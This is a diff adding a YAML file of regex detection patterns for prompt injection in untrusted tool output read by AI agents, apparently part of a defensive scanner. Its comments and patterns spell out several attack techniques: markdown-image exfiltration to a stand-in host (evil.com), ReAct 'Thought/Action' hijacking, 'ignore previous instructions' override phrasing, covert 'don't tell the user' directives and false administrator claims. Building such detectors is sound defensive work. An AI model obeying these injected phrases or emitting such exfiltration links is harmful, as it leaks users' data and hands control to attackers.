@@ -1,0 +1,62 @@
+# Default evidence patterns for L2a data payload detection (Phase 1b).
+#
+# These patterns detect injection signals in untrusted data segments.
+# Action: Evidence — matches are collected but NEVER trigger a block verdict.
+# Trust gate: Untrusted — only scanned against untrusted content.
+#
+# Group A: Structural exploit patterns (high confidence)
+# Group B: Statistical anomaly patterns (moderate confidence)
+
+evidence_patterns:
+  # ---------------------------------------------------------------
+  # Group A: Structural Exploit Patterns
+  # ---------------------------------------------------------------
+
+  # Markdown image exfiltration: data egress via image render.
+  # Attacker embeds ![img](https://evil.com/steal?data=...) in tool output.
+  # Near-zero FPR in data payloads — legitimate tool results rarely contain
+  # markdown images with query parameters.
+  - category: exfil
+    pattern: "!\\[.*\\]\\(https?://[^)]*\\?[^)]*="
+
+  # ReAct agent injection: hijacks agent reasoning loops.
+  # Pattern: "Thought: ... Action: ..." spanning lines (multiline).
+  # Low FPR in tool results — this is agent framework syntax, not natural text.
+  - category: react_inject
+    pattern: "(?si)Thought:.*Action:"
+
+  # Instruction bypass phrasing: classic override pattern.
+  # Vigil-style regex. Moderate FPR — could appear in security documentation.
+  - category: instruction_bypass
+    pattern: "(?i)(Ignore|Disregard|Forget)\\s+(all\\s+)?(previous|prior|above|earlier)\\s+(instructions|context|rules|guidelines|directives)"
+
+  # ---------------------------------------------------------------
+  # Group B: Statistical Anomaly Patterns
+  # ---------------------------------------------------------------
+
+  # Imperative density: injection-specific directive language in data payloads.
+  # Narrowed phrase list: removed common benign phrases (you must, you should,
+  # your task is, respond with, output the, you will) — these appear in normal
+  # chat and documentation. Kept only injection-specific directives.
+  # Single-match threshold: corpus analysis shows 97.7% precision at >=1 match
+  # with the narrowed list (259 mal, 6 ben across 17K L3 inbound cases).
+  - category: imperative_density
+    pattern: "(?i)(from now on|you are required to|do not reveal|do not disclose|always respond as|never mention|under no circumstances)"
+
+  # ---------------------------------------------------------------
+  # Group C: Social Engineering Patterns
+  # ---------------------------------------------------------------
+
+  # Covert instruction: directives to hide actions from the user.
+  # Tool results and data payloads should never instruct the model to act
+  # secretly or hide information from the user. 80% precision, near-zero FPR.
+  # Source: DMPI-PMHFE is_covert feature.
+  - category: covert_instruction
+    pattern: "(?i)(do (this |it )?secretly|don'?t (tell|reveal|mention|show|disclose) (the user|anyone|them)|hide (this|your|the) (response|output|action)|covertly|without (the user|them|anyone) knowing|between you and me)"
+
+  # Authority claim: social engineering via false authority in data payloads.
+  # Tool results don't claim to be administrators or have elevated privileges.
+  # 100% precision on eval corpus (17 mal, 0 ben).
+  # Source: DMPI-PMHFE is_systemic feature.
+  - category: authority_claim
+    pattern: "(?i)(I am (the |your )?(administrator|developer|creator|owner|root|supervisor)|admin access granted|authorized (to|by) (the )?(admin|system|developer)|elevated privileges|I have (admin|root|developer) (access|rights|permissions))"
